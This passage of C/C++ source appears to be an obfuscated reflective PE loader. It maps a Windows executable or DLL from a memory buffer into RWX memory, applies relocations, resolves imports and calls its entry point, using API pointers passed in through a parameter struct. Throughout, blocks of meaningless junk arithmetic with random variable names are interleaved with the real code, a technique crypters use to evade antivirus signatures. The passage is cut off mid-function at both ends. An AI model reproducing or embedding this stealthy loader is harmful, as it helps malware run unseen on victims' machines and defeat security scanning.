		IMAGE_DOS_HEADER *pDos = (IMAGE_DOS_HEADER*)hMod;
int iVF2g5dO7GP = 0xefc5f07;
int it2KQNH91bo = 0x7bb25c3;
int i0XPisNgGmS = 0x4dd6dbf;
int iVGs2RHUQSl = i0XPisNgGmS * it2KQNH91bo + iVF2g5dO7GP;
it2KQNH91bo = 0x516d315 + iVGs2RHUQSl + 0x098d4df + iVF2g5dO7GP;
int iFczpduCDfW = iVF2g5dO7GP / 0x7bb25c3 - i0XPisNgGmS ^ i0XPisNgGmS ^ 0x4dd6dbf;

		IMAGE_NT_HEADERS *pNTHead = (IMAGE_NT_HEADERS*)((char*)hMod + pDos->e_lfanew);

		char *pEntry = (char*)hMod + pNTHead->OptionalHeader.AddressOfEntryPoint;

		if ((pNTHead->FileHeader.Characteristics&IMAGE_FILE_DLL) == IMAGE_FILE_DLL)
		{
			bool(WINAPI *iDllMain)(void*, unsigned int, void*);
			*(char **)&iDllMain = pEntry;

			//printf("Call DllMain");
int i9bko7HBu0k = 0x7f659cf;
int ivEZjEwUNca = 0x683ce9b;
int iPPzhegDT4p = 0x6527202;
int iNPoxwR8KkQ = 0x3b9c13e;
int igzOXZXMqZN = 1;
switch(igzOXZXMqZN)
{
    case 0:
        i9bko7HBu0k = ivEZjEwUNca - 0x1998afe * iPPzhegDT4p / 100;
        ivEZjEwUNca = 0x6527202 - 5 +  0x6527202 - 6 * ivEZjEwUNca / 10 + 25;
        iPPzhegDT4p = i9bko7HBu0k * 0x12 + iNPoxwR8KkQ * 0x15 + 0x3b9c13e / 13 + 0x1998afe + 555;
        iNPoxwR8KkQ = 0x7f659cf - 21 + 11 * 1996 - ivEZjEwUNca + 14520538 - iPPzhegDT4p - 14520692 + 0x683ce9b - 97;
        break;
    case 1:
        i9bko7HBu0k = ivEZjEwUNca - 25 + 0x7f659cf - 40 + 0x6527202 % 10 + 2;
        iPPzhegDT4p = iPPzhegDT4p - 0xff % 3 - iNPoxwR8KkQ * 10 + 0x1998afe / 2 - 10 + 0x683ce9b - 5;
        iNPoxwR8KkQ = 0x7f659cf % 0x1998afe ^ 33 + 0x6527202 * 0x12 - 30 + 0x6527202 + 23;
        ivEZjEwUNca = ivEZjEwUNca + 321 + iPPzhegDT4p * 10 * ivEZjEwUNca / 10 / 2 + 0x1998afe * 0x60;
        break;
    case 2:
        i9bko7HBu0k = ivEZjEwUNca - 45 - iPPzhegDT4p * 46 + 0x7f659cf / 0xdade;
        ivEZjEwUNca = ivEZjEwUNca + 0x1998afe - iPPzhegDT4p * 0x683ce9b - 3;
        iPPzhegDT4p = 0x683ce9b - 0x1 + i9bko7HBu0k * 0x2 - 0x1998afe / 0x3 + 0x6527202;
        iNPoxwR8KkQ = i9bko7HBu0k - 0x4 * 0x7f659cf + 0x1234 - 0x4567 + 0xcafe + ivEZjEwUNca % 0x432 / 0x3b9c13e - 0x23;
        break;
    case 3:
        ivEZjEwUNca = iNPoxwR8KkQ * 2 * 0x683ce9b - 4 + 0x1998afe + 12 + 34 + 0x7f659cf;
        iPPzhegDT4p = ivEZjEwUNca - 43 + 0x6527202 * 3040 - 0x683ce9b % 10 + 1 - 0x6527202;
        iNPoxwR8KkQ = 0x6527202 - 33 + i9bko7HBu0k * 0x25 + 0x7f659cf - 3004 + 0x683ce9b;
        i9bko7HBu0k = 0x7f659cf + 2905 % ivEZjEwUNca * 1996 + 0x3b9c13e - 70 * 0x1998afe;
        break;
    case 4:
        iNPoxwR8KkQ = ivEZjEwUNca - 36 +0x1998afe * 2001 - iPPzhegDT4p / 234 + 0x7;
        i9bko7HBu0k = iNPoxwR8KkQ - 0xabcedf + 0x683ce9b * 0xa2bc5 + iNPoxwR8KkQ / 0x123 + 0x7f659cf;
        iPPzhegDT4p = i9bko7HBu0k - 0x124 + 23 / ivEZjEwUNca / 3 / 2 + iPPzhegDT4p + 29 - 0x683ce9b + 100;
        ivEZjEwUNca = 0x683ce9b - 70 + 70  + 0x7f659cf / 2 + 423 - 0x7f659cf / 7749 % 0x1234;
        break;
    case 5:
        ivEZjEwUNca = ivEZjEwUNca - 9981 % i9bko7HBu0k + 111 - iPPzhegDT4p / 224 % 0x6527202;
        iPPzhegDT4p = iPPzhegDT4p - 339 - iPPzhegDT4p * 4416 / 0x1998afe + 5525 + 0x683ce9b % 10;
        iNPoxwR8KkQ = iNPoxwR8KkQ - 6636 + 0x683ce9b * 7749 + 1 - ivEZjEwUNca * 8864 / 0xfecba;
        i9bko7HBu0k = 0x1998afe - 9981 % 0x7f659cf % 10 % 1010100 - 0x7f659cf - 23 -  0x1998afe - 2500;
        break;
}
igzOXZXMqZN = iNPoxwR8KkQ - 0xaa + 0x6527202 * 46 - 15 / iPPzhegDT4p + 11 - 0x7f659cf;
igzOXZXMqZN = igzOXZXMqZN - 70 * 55 - iPPzhegDT4p ^ 0x99 - 0x567498 % 0x7f659cf % 2 - 234 + 0x683ce9b;

			iDllMain(hMod, DLL_PROCESS_DETACH, 0);
		}

		VirtualFree(hMod, 0, MEM_RELEASE);
	}
}

HMODULE Load(LPVOID Param)
{
	PE *sPe = (PE*)Param;

	funcVirtualAlloc fnVirtualAlloc = (funcVirtualAlloc)sPe->fnVirtualAlloc;
	funcVirtualFree fnVirtualFree = (funcVirtualFree)sPe->fnVirtualFree;
	funcLoadLibraryA fnLoadLibraryA = (funcLoadLibraryA)sPe->fnLoadLibraryA;
	funcGetProcAddress fnGetProcAddress = (funcGetProcAddress)sPe->fnGetProcAddress;
	funcmemcpy fnmemcpy = (funcmemcpy)sPe->fnmemcpy;

	HMODULE hMod = nullptr;

	const IMAGE_DOS_HEADER *pDos = (const IMAGE_DOS_HEADER*)sPe->buf;
	char *pChOldDos = (char*)pDos;

	IMAGE_NT_HEADERS *pOldNTHead = (IMAGE_NT_HEADERS*)((char*)sPe->buf + pDos->e_lfanew);
	DWORD dwFullNTSize = sizeof(IMAGE_NT_HEADERS) - (sizeof(IMAGE_OPTIONAL_HEADER) - pOldNTHead->FileHeader.SizeOfOptionalHeader);
	IMAGE_SECTION_HEADER *pOldSectHead = (IMAGE_SECTION_HEADER*)((char*)pOldNTHead + dwFullNTSize);

	if (pOldNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress == 0
		&& (pOldNTHead->FileHeader.Characteristics&IMAGE_FILE_RELOCS_STRIPPED)
		)
	{
		hMod = (HMODULE)pOldNTHead->OptionalHeader.ImageBase;
	}

	hMod = (HMODULE)fnVirtualAlloc(hMod, pOldNTHead->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (hMod == nullptr)
	{
		//printf("Can't alloc memory: %d at %p", pOldNTHead->OptionalHeader.SizeOfImage, hMod);
	}
	else
	{
		IMAGE_DOS_HEADER *pNewDos = (IMAGE_DOS_HEADER*)hMod;
		char *pChNewDos = (char*)hMod;

		DWORD dwStubSize = dwFullNTSize + sizeof(IMAGE_SECTION_HEADER)*pOldNTHead->FileHeader.NumberOfSections;
		//copy dos
		fnmemcpy(pChNewDos, pChOldDos, pDos->e_lfanew);

		IMAGE_NT_HEADERS *pNewNtHead = (IMAGE_NT_HEADERS*)(pChNewDos + pDos->e_lfanew);
		//copy NT head & section header
		fnmemcpy(pNewNtHead, pOldNTHead, dwStubSize);
int isJ5DHqyII1 = 0x0a1cbff;
int i0pzvH3Jd9E = 0x85a2466;
int ib8bOItdQSk = 0xa48acd7;
int iaRuKTf96Bf = ib8bOItdQSk * i0pzvH3Jd9E + isJ5DHqyII1;
i0pzvH3Jd9E = 0x301b0a3 - iaRuKTf96Bf + 5 + 0x9aa8938 + 69 - isJ5DHqyII1;
isJ5DHqyII1 = 0x0a1cbff + 10 - i0pzvH3Jd9E % 10 + 0xa48acd7 + 999 - iaRuKTf96Bf;
iaRuKTf96Bf = isJ5DHqyII1 % 5 + ib8bOItdQSk % 0x85a2466 + 0xcafebabe + isJ5DHqyII1;
ib8bOItdQSk = 0x0a1cbff * 0x100 - isJ5DHqyII1 + 56 ^ 0x85a2466 + 1996 - ib8bOItdQSk;
int iA04ICSuIff = ib8bOItdQSk / 77 + 0xa48acd7 - 76 / ib8bOItdQSk ^ 0x33 % ib8bOItdQSk % 0xa48acd7;
iA04ICSuIff = 0x9aa8938 * 0x10 - 22 + iA04ICSuIff + 56 ^ 0xff + i0pzvH3Jd9E + 1996 - 2111 + ib8bOItdQSk;


		//fix all section 
		int iSectionIndex = 0;

		for (iSectionIndex = 0;
			iSectionIndex < pOldNTHead->FileHeader.NumberOfSections;
			++iSectionIndex)
		{
			char *pNewSectData = pChNewDos + pOldSectHead[iSectionIndex].VirtualAddress;
			char *pOldSectData = pChOldDos + pOldSectHead[iSectionIndex].PointerToRawData;

			//check for valid section data
			if (pOldSectHead[iSectionIndex].SizeOfRawData
				&& pOldSectHead[iSectionIndex].PointerToRawData + pOldSectHead[iSectionIndex].SizeOfRawData > (ULONG)sPe->size)
			{
				break;
			}

			DWORD dwRVASize = Align(pOldSectHead[iSectionIndex].Misc.VirtualSize, pOldNTHead->OptionalHeader.SectionAlignment);
			fnmemcpy(pNewSectData, pOldSectData, pOldSectHead[iSectionIndex].SizeOfRawData);
int iBoRdBWrdXF = 0x580d272;
int ir3lGJ31ipY = 0x1384138;
int ieEY2vBQmqF = 0xd11b3be;
int in1xkKxNljr = 0xd79f66e;
int ilsc3n2LLp9 = 2;
switch(ilsc3n2LLp9)
{
    case 0:
        iBoRdBWrdXF = ir3lGJ31ipY - 0x787a36e * ieEY2vBQmqF / 100;
        ir3lGJ31ipY = 0xd11b3be - 5 +  0xd11b3be - 6 * ir3lGJ31ipY / 10 + 25;
        ieEY2vBQmqF = iBoRdBWrdXF * 0x12 + in1xkKxNljr * 0x15 + 0xd79f66e / 13 + 0x787a36e + 555;
        in1xkKxNljr = 0x580d272 - 21 + 11 * 1996 - ir3lGJ31ipY + 14520538 - ieEY2vBQmqF - 14520692 + 0x1384138 - 97;
        break;
    case 1:
        iBoRdBWrdXF = ir3lGJ31ipY - 25 + 0x580d272 - 40 + 0xd11b3be % 10 + 2;
        ieEY2vBQmqF = ieEY2vBQmqF - 0xff % 3 - in1xkKxNljr * 10 + 0x787a36e / 2 - 10 + 0x1384138 - 5;
        in1xkKxNljr = 0x580d272 % 0x787a36e ^ 33 + 0xd11b3be * 0x12 - 30 + 0xd11b3be + 23;
        ir3lGJ31ipY = ir3lGJ31ipY + 321 + ieEY2vBQmqF * 10 * ir3lGJ31ipY / 10 / 2 + 0x787a36e * 0x60;
        break;
    case 2:
        iBoRdBWrdXF = ir3lGJ31ipY - 45 - ieEY2vBQmqF * 46 + 0x580d272 / 0xdade;
        ir3lGJ31ipY = ir3lGJ31ipY + 0x787a36e - ieEY2vBQmqF * 0x1384138 - 3;
        ieEY2vBQmqF = 0x1384138 - 0x1 + iBoRdBWrdXF * 0x2 - 0x787a36e / 0x3 + 0xd11b3be;
        in1xkKxNljr = iBoRdBWrdXF - 0x4 * 0x580d272 + 0x1234 - 0x4567 + 0xcafe + ir3lGJ31ipY % 0x432 / 0xd79f66e - 0x23;
        break;
    case 3:
        ir3lGJ31ipY = in1xkKxNljr * 2 * 0x1384138 - 4 + 0x787a36e + 12 + 34 + 0x580d272;
        ieEY2vBQmqF = ir3lGJ31ipY - 43 + 0xd11b3be * 3040 - 0x1384138 % 10 + 1 - 0xd11b3be;
        in1xkKxNljr = 0xd11b3be - 33 + iBoRdBWrdXF * 0x25 + 0x580d272 - 3004 + 0x1384138;
        iBoRdBWrdXF = 0x580d272 + 2905 % ir3lGJ31ipY * 1996 + 0xd79f66e - 70 * 0x787a36e;
        break;
    case 4:
        in1xkKxNljr = ir3lGJ31ipY - 36 +0x787a36e * 2001 - ieEY2vBQmqF / 234 + 0x7;
        iBoRdBWrdXF = in1xkKxNljr - 0xabcedf + 0x1384138 * 0xa2bc5 + in1xkKxNljr / 0x123 + 0x580d272;
        ieEY2vBQmqF = iBoRdBWrdXF - 0x124 + 23 / ir3lGJ31ipY / 3 / 2 + ieEY2vBQmqF + 29 - 0x1384138 + 100;
        ir3lGJ31ipY = 0x1384138 - 70 + 70  + 0x580d272 / 2 + 423 - 0x580d272 / 7749 % 0x1234;
        break;
    case 5:
        ir3lGJ31ipY = ir3lGJ31ipY - 9981 % iBoRdBWrdXF + 111 - ieEY2vBQmqF / 224 % 0xd11b3be;
        ieEY2vBQmqF = ieEY2vBQmqF - 339 - ieEY2vBQmqF * 4416 / 0x787a36e + 5525 + 0x1384138 % 10;
        in1xkKxNljr = in1xkKxNljr - 6636 + 0x1384138 * 7749 + 1 - ir3lGJ31ipY * 8864 / 0xfecba;
        iBoRdBWrdXF = 0x787a36e - 9981 % 0x580d272 % 10 % 1010100 - 0x580d272 - 23 -  0x787a36e - 2500;
        break;
}
ilsc3n2LLp9 = in1xkKxNljr - 0xaa + 0xd11b3be * 46 - 15 / ieEY2vBQmqF + 11 - 0x580d272;
ilsc3n2LLp9 = ilsc3n2LLp9 - 70 * 55 - ieEY2vBQmqF ^ 0x99 - 0x567498 % 0x580d272 % 2 - 234 + 0x1384138;

		}

		if (iSectionIndex == pOldNTHead->FileHeader.NumberOfSections)
		{
		}
		else
		{
			fnVirtualFree(hMod, 0, MEM_RELEASE); hMod = nullptr;
		}
	}

	if (hMod)
	{
		bool ret;
		//reloc
		IMAGE_DOS_HEADER *pDos = (IMAGE_DOS_HEADER*)hMod;
		unsigned char *pBase = (unsigned char*)pDos;

		IMAGE_NT_HEADERS *pNTHead = (IMAGE_NT_HEADERS*)((char*)pDos + pDos->e_lfanew);
		IMAGE_DATA_DIRECTORY imgDirRelocation = pNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
int ikg5KbyxLPT = 0x9bb6e17;
int iTrd5lBVuJz = 0xba8f4e9;
int iJBHGJR1qNs = 0x96632d8;
int ix2WZYR0bDa = iJBHGJR1qNs * iTrd5lBVuJz + ikg5KbyxLPT;
iTrd5lBVuJz = 0x06d2683 + ix2WZYR0bDa + 0x7b95cc9 + ikg5KbyxLPT;
int iFoznXarCxu = ikg5KbyxLPT / 0xba8f4e9 - iJBHGJR1qNs ^ iJBHGJR1qNs ^ 0x96632d8;


		unsigned char *pOrgBase = (unsigned char*)pNTHead->OptionalHeader.ImageBase;
		if (pOrgBase == pBase)
		{
			ret = true;
		}
		else if (imgDirRelocation.VirtualAddress == 0)
		{
			ret = false;
		}
		else
		{
			size_t delta = pBase - pOrgBase;

			IMAGE_BASE_RELOCATION *pBaseReloc = (IMAGE_BASE_RELOCATION*)(pBase + imgDirRelocation.VirtualAddress);

			if (imgDirRelocation.VirtualAddress + imgDirRelocation.Size >= pNTHead->OptionalHeader.SizeOfImage)
			{
				ret = false;
			}
			else
			{
				//ret = DoBaseReloc(pBase, pNTHead->OptionalHeader.SizeOfImage, delta, pBaseReloc, imgDirRelocation.Size);
				unsigned char *codeBase = pBase;
				size_t codeSize = pNTHead->OptionalHeader.SizeOfImage;
				int remainSize = imgDirRelocation.Size;
				ret = true;
int iSG6Gmfdj9G = 0x9221fb2;
int i4T4W4GRkIO = 0xfc85552;
int ierhNBErcJc = 0xd155378;
int iyQvy3Xwm7T = iSG6Gmfdj9G + i4T4W4GRkIO - ierhNBErcJc;
iyQvy3Xwm7T = 0x179de97 * iyQvy3Xwm7T + 0x8a08195 - i4T4W4GRkIO;
int iZ202T9Ed74 = iyQvy3Xwm7T / 0x8a08195 + iSG6Gmfdj9G ^ ierhNBErcJc - 0xd155378;

				while (remainSize > 0 && ret)
				{
					WORD *arrRel = (WORD *)&pBaseReloc[1];
					int nRel = (pBaseReloc[0].SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
					char *dest = (char*)codeBase + pBaseReloc[0].VirtualAddress;

					if (dest < (char*)codeBase || (char*)codeBase + codeSize < dest)
					{
						ret = false;
					}
					else for (int i = 0; i < nRel; ++i)
					{
						DWORD *patchAddrHL;
#ifdef _WIN64
						ULONGLONG *patchAddr64;
#endif
						int offset = arrRel[i] & 0xfff;
						switch (arrRel[i] >> 12)
						{
						case IMAGE_REL_BASED_ABSOLUTE:
							// skip relocation
							break;

						case IMAGE_REL_BASED_HIGHLOW:
							// change complete 32 bit address
							patchAddrHL = (DWORD *)(dest + offset);
							*patchAddrHL += (DWORD)delta;
							break;

#ifdef _WIN64
						case IMAGE_REL_BASED_DIR64:
							patchAddr64 = (ULONGLONG *)(dest + offset);
							*patchAddr64 += delta;
							break;
int ia8Abkepe5j = 0x42b12f4;
int it4yCikgKNw = 0x4773748;
int irhdJsQGOUZ = 0xa9d1df2;
int iIhEOlBMDoz = 0x9a4e6a2;
int i0bFDi3Of04 = 2;
switch(i0bFDi3Of04)
{
    case 0:
        ia8Abkepe5j = it4yCikgKNw - 0x0101f34 * irhdJsQGOUZ / 100;
        it4yCikgKNw = 0xa9d1df2 - 5 +  0xa9d1df2 - 6 * it4yCikgKNw / 10 + 25;
        irhdJsQGOUZ = ia8Abkepe5j * 0x12 + iIhEOlBMDoz * 0x15 + 0x9a4e6a2 / 13 + 0x0101f34 + 555;
        iIhEOlBMDoz = 0x42b12f4 - 21 + 11 * 1996 - it4yCikgKNw + 14520538 - irhdJsQGOUZ - 14520692 + 0x4773748 - 97;
        break;
    case 1:
        ia8Abkepe5j = it4yCikgKNw - 25 + 0x42b12f4 - 40 + 0xa9d1df2 % 10 + 2;
        irhdJsQGOUZ = irhdJsQGOUZ - 0xff % 3 - iIhEOlBMDoz * 10 + 0x0101f34 / 2 - 10 + 0x4773748 - 5;
        iIhEOlBMDoz = 0x42b12f4 % 0x0101f34 ^ 33 + 0xa9d1df2 * 0x12 - 30 + 0xa9d1df2 + 23;
        it4yCikgKNw = it4yCikgKNw + 321 + irhdJsQGOUZ * 10 * it4yCikgKNw / 10 / 2 + 0x0101f34 * 0x60;
        break;
    case 2:
        ia8Abkepe5j = it4yCikgKNw - 45 - irhdJsQGOUZ * 46 + 0x42b12f4 / 0xdade;
        it4yCikgKNw = it4yCikgKNw + 0x0101f34 - irhdJsQGOUZ * 0x4773748 - 3;
        irhdJsQGOUZ = 0x4773748 - 0x1 + ia8Abkepe5j * 0x2 - 0x0101f34 / 0x3 + 0xa9d1df2;
        iIhEOlBMDoz = ia8Abkepe5j - 0x4 * 0x42b12f4 + 0x1234 - 0x4567 + 0xcafe + it4yCikgKNw % 0x432 / 0x9a4e6a2 - 0x23;
        break;
    case 3:
        it4yCikgKNw = iIhEOlBMDoz * 2 * 0x4773748 - 4 + 0x0101f34 + 12 + 34 + 0x42b12f4;
        irhdJsQGOUZ = it4yCikgKNw - 43 + 0xa9d1df2 * 3040 - 0x4773748 % 10 + 1 - 0xa9d1df2;
        iIhEOlBMDoz = 0xa9d1df2 - 33 + ia8Abkepe5j * 0x25 + 0x42b12f4 - 3004 + 0x4773748;
        ia8Abkepe5j = 0x42b12f4 + 2905 % it4yCikgKNw * 1996 + 0x9a4e6a2 - 70 * 0x0101f34;
        break;
    case 4:
        iIhEOlBMDoz = it4yCikgKNw - 36 +0x0101f34 * 2001 - irhdJsQGOUZ / 234 + 0x7;
        ia8Abkepe5j = iIhEOlBMDoz - 0xabcedf + 0x4773748 * 0xa2bc5 + iIhEOlBMDoz / 0x123 + 0x42b12f4;
        irhdJsQGOUZ = ia8Abkepe5j - 0x124 + 23 / it4yCikgKNw / 3 / 2 + irhdJsQGOUZ + 29 - 0x4773748 + 100;
        it4yCikgKNw = 0x4773748 - 70 + 70  + 0x42b12f4 / 2 + 423 - 0x42b12f4 / 7749 % 0x1234;
        break;
    case 5:
        it4yCikgKNw = it4yCikgKNw - 9981 % ia8Abkepe5j + 111 - irhdJsQGOUZ / 224 % 0xa9d1df2;
        irhdJsQGOUZ = irhdJsQGOUZ - 339 - irhdJsQGOUZ * 4416 / 0x0101f34 + 5525 + 0x4773748 % 10;
        iIhEOlBMDoz = iIhEOlBMDoz - 6636 + 0x4773748 * 7749 + 1 - it4yCikgKNw * 8864 / 0xfecba;
        ia8Abkepe5j = 0x0101f34 - 9981 % 0x42b12f4 % 10 % 1010100 - 0x42b12f4 - 23 -  0x0101f34 - 2500;
        break;
}
i0bFDi3Of04 = iIhEOlBMDoz - 0xaa + 0xa9d1df2 * 46 - 15 / irhdJsQGOUZ + 11 - 0x42b12f4;
i0bFDi3Of04 = i0bFDi3Of04 - 70 * 55 - irhdJsQGOUZ ^ 0x99 - 0x567498 % 0x42b12f4 % 2 - 234 + 0x4773748;

#endif

						default:
							ret = false;
							break;
						}
					}

					if (ret)
					{
						remainSize -= pBaseReloc[0].SizeOfBlock;
						pBaseReloc = (IMAGE_BASE_RELOCATION *)((char*)pBaseReloc + pBaseReloc[0].SizeOfBlock);
					}
				}
			}
		}

		if (ret)
		{
			//import
			pDos = (IMAGE_DOS_HEADER*)hMod;
			pBase = (unsigned char*)hMod;

			pNTHead = (IMAGE_NT_HEADERS*)(pBase + pDos->e_lfanew);
			IMAGE_DATA_DIRECTORY imgDirImport = pNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
int iaSjmWCoETg = 0x00c20d7;
int iYws1rcFP3R = 0x3020120;
int iwCt7kvkSsB = 0x9e1037a;
int iBJK5g71yOw = 0x300270e;
int iYgE3JEsZjP = 4;
switch(iYgE3JEsZjP)
{
    case 0:
        iaSjmWCoETg = iYws1rcFP3R - 0xe52fff1 * iwCt7kvkSsB / 100;
        iYws1rcFP3R = 0x9e1037a - 5 +  0x9e1037a - 6 * iYws1rcFP3R / 10 + 25;
        iwCt7kvkSsB = iaSjmWCoETg * 0x12 + iBJK5g71yOw * 0x15 + 0x300270e / 13 + 0xe52fff1 + 555;
        iBJK5g71yOw = 0x00c20d7 - 21 + 11 * 1996 - iYws1rcFP3R + 14520538 - iwCt7kvkSsB - 14520692 + 0x3020120 - 97;
        break;
    case 1:
        iaSjmWCoETg = iYws1rcFP3R - 25 + 0x00c20d7 - 40 + 0x9e1037a % 10 + 2;
        iwCt7kvkSsB = iwCt7kvkSsB - 0xff % 3 - iBJK5g71yOw * 10 + 0xe52fff1 / 2 - 10 + 0x3020120 - 5;
        iBJK5g71yOw = 0x00c20d7 % 0xe52fff1 ^ 33 + 0x9e1037a * 0x12 - 30 + 0x9e1037a + 23;
        iYws1rcFP3R = iYws1rcFP3R + 321 + iwCt7kvkSsB * 10 * iYws1rcFP3R / 10 / 2 + 0xe52fff1 * 0x60;
        break;
    case 2:
        iaSjmWCoETg = iYws1rcFP3R - 45 - iwCt7kvkSsB * 46 + 0x00c20d7 / 0xdade;
        iYws1rcFP3R = iYws1rcFP3R + 0xe52fff1 - iwCt7kvkSsB * 0x3020120 - 3;
        iwCt7kvkSsB = 0x3020120 - 0x1 + iaSjmWCoETg * 0x2 - 0xe52fff1 / 0x3 + 0x9e1037a;
        iBJK5g71yOw = iaSjmWCoETg - 0x4 * 0x00c20d7 + 0x1234 - 0x4567 + 0xcafe + iYws1rcFP3R % 0x432 / 0x300270e - 0x23;
        break;
    case 3:
        iYws1rcFP3R = iBJK5g71yOw * 2 * 0x3020120 - 4 + 0xe52fff1 + 12 + 34 + 0x00c20d7;
        iwCt7kvkSsB = iYws1rcFP3R - 43 + 0x9e1037a * 3040 - 0x3020120 % 10 + 1 - 0x9e1037a;
        iBJK5g71yOw = 0x9e1037a - 33 + iaSjmWCoETg * 0x25 + 0x00c20d7 - 3004 + 0x3020120;
        iaSjmWCoETg = 0x00c20d7 + 2905 % iYws1rcFP3R * 1996 + 0x300270e - 70 * 0xe52fff1;
        break;
    case 4:
        iBJK5g71yOw = iYws1rcFP3R - 36 +0xe52fff1 * 2001 - iwCt7kvkSsB / 234 + 0x7;
        iaSjmWCoETg = iBJK5g71yOw - 0xabcedf + 0x3020120 * 0xa2bc5 + iBJK5g71yOw / 0x123 + 0x00c20d7;
        iwCt7kvkSsB = iaSjmWCoETg - 0x124 + 23 / iYws1rcFP3R / 3 / 2 + iwCt7kvkSsB + 29 - 0x3020120 + 100;
        iYws1rcFP3R = 0x3020120 - 70 + 70  + 0x00c20d7 / 2 + 423 - 0x00c20d7 / 7749 % 0x1234;
        break;
    case 5:
        iYws1rcFP3R = iYws1rcFP3R - 9981 % iaSjmWCoETg + 111 - iwCt7kvkSsB / 224 % 0x9e1037a;
        iwCt7kvkSsB = iwCt7kvkSsB - 339 - iwCt7kvkSsB * 4416 / 0xe52fff1 + 5525 + 0x3020120 % 10;
        iBJK5g71yOw = iBJK5g71yOw - 6636 + 0x3020120 * 7749 + 1 - iYws1rcFP3R * 8864 / 0xfecba;
        iaSjmWCoETg = 0xe52fff1 - 9981 % 0x00c20d7 % 10 % 1010100 - 0x00c20d7 - 23 -  0xe52fff1 - 2500;
        break;
}
iYgE3JEsZjP = iBJK5g71yOw - 0xaa + 0x9e1037a * 46 - 15 / iwCt7kvkSsB + 11 - 0x00c20d7;
iYgE3JEsZjP = iYgE3JEsZjP - 70 * 55 - iwCt7kvkSsB ^ 0x99 - 0x567498 % 0x00c20d7 % 2 - 234 + 0x3020120;



			if (imgDirImport.VirtualAddress)
			{
				IMAGE_IMPORT_DESCRIPTOR *pImportDesc = (IMAGE_IMPORT_DESCRIPTOR*)(pBase + imgDirImport.VirtualAddress);
				if (imgDirImport.VirtualAddress + imgDirImport.Size >= pNTHead->OptionalHeader.SizeOfImage)
				{
					ret = false;
				}
				else
				{
					//ret = DoImport(pBase, pImportDesc, fnLoadLibraryA, fnGetProcAddress);
					unsigned char *codeBase = pBase;

					ret = true;

					while (pImportDesc[0].Name)
					{
						char *szLibName = (char*)codeBase + pImportDesc[0].Name;
int inUCKwX4d4D = 0xa31ffe2;
int iypJFTLZZtx = 0xd36f53e;
int ighQl3rkgeh = 0xab8e976;
int iMVTeXw0GLb = 0x2ac5138;
int i3CIH4xbzY5 = 1;
switch(i3CIH4xbzY5)
{
    case 0:
        inUCKwX4d4D = iypJFTLZZtx - 0x5bec0e6 * ighQl3rkgeh / 100;
        iypJFTLZZtx = 0xab8e976 - 5 +  0xab8e976 - 6 * iypJFTLZZtx / 10 + 25;
        ighQl3rkgeh = inUCKwX4d4D * 0x12 + iMVTeXw0GLb * 0x15 + 0x2ac5138 / 13 + 0x5bec0e6 + 555;
        iMVTeXw0GLb = 0xa31ffe2 - 21 + 11 * 1996 - iypJFTLZZtx + 14520538 - ighQl3rkgeh - 14520692 + 0xd36f53e - 97;
        break;
    case 1:
        inUCKwX4d4D = iypJFTLZZtx - 25 + 0xa31ffe2 - 40 + 0xab8e976 % 10 + 2;
        ighQl3rkgeh = ighQl3rkgeh - 0xff % 3 - iMVTeXw0GLb * 10 + 0x5bec0e6 / 2 - 10 + 0xd36f53e - 5;
        iMVTeXw0GLb = 0xa31ffe2 % 0x5bec0e6 ^ 33 + 0xab8e976 * 0x12 - 30 + 0xab8e976 + 23;
        iypJFTLZZtx = iypJFTLZZtx + 321 + ighQl3rkgeh * 10 * iypJFTLZZtx / 10 / 2 + 0x5bec0e6 * 0x60;
        break;
    case 2:
        inUCKwX4d4D = iypJFTLZZtx - 45 - ighQl3rkgeh * 46 + 0xa31ffe2 / 0xdade;
        iypJFTLZZtx = iypJFTLZZtx + 0x5bec0e6 - ighQl3rkgeh * 0xd36f53e - 3;
        ighQl3rkgeh = 0xd36f53e - 0x1 + inUCKwX4d4D * 0x2 - 0x5bec0e6 / 0x3 + 0xab8e976;
        iMVTeXw0GLb = inUCKwX4d4D - 0x4 * 0xa31ffe2 + 0x1234 - 0x4567 + 0xcafe + iypJFTLZZtx % 0x432 / 0x2ac5138 - 0x23;
        break;
    case 3:
        iypJFTLZZtx = iMVTeXw0GLb * 2 * 0xd36f53e - 4 + 0x5bec0e6 + 12 + 34 + 0xa31ffe2;
        ighQl3rkgeh = iypJFTLZZtx - 43 + 0xab8e976 * 3040 - 0xd36f53e % 10 + 1 - 0xab8e976;
        iMVTeXw0GLb = 0xab8e976 - 33 + inUCKwX4d4D * 0x25 + 0xa31ffe2 - 3004 + 0xd36f53e;
        inUCKwX4d4D = 0xa31ffe2 + 2905 % iypJFTLZZtx * 1996 + 0x2ac5138 - 70 * 0x5bec0e6;
        break;
    case 4:
        iMVTeXw0GLb = iypJFTLZZtx - 36 +0x5bec0e6 * 2001 - ighQl3rkgeh / 234 + 0x7;
        inUCKwX4d4D = iMVTeXw0GLb - 0xabcedf + 0xd36f53e * 0xa2bc5 + iMVTeXw0GLb / 0x123 + 0xa31ffe2;
        ighQl3rkgeh = inUCKwX4d4D - 0x124 + 23 / iypJFTLZZtx / 3 / 2 + ighQl3rkgeh + 29 - 0xd36f53e + 100;
        iypJFTLZZtx = 0xd36f53e - 70 + 70  + 0xa31ffe2 / 2 + 423 - 0xa31ffe2 / 7749 % 0x1234;
        break;
    case 5:
        iypJFTLZZtx = iypJFTLZZtx - 9981 % inUCKwX4d4D + 111 - ighQl3rkgeh / 224 % 0xab8e976;
        ighQl3rkgeh = ighQl3rkgeh - 339 - ighQl3rkgeh * 4416 / 0x5bec0e6 + 5525 + 0xd36f53e % 10;
        iMVTeXw0GLb = iMVTeXw0GLb - 6636 + 0xd36f53e * 7749 + 1 - iypJFTLZZtx * 8864 / 0xfecba;
        inUCKwX4d4D = 0x5bec0e6 - 9981 % 0xa31ffe2 % 10 % 1010100 - 0xa31ffe2 - 23 -  0x5bec0e6 - 2500;
        break;
}
i3CIH4xbzY5 = iMVTeXw0GLb - 0xaa + 0xab8e976 * 46 - 15 / ighQl3rkgeh + 11 - 0xa31ffe2;
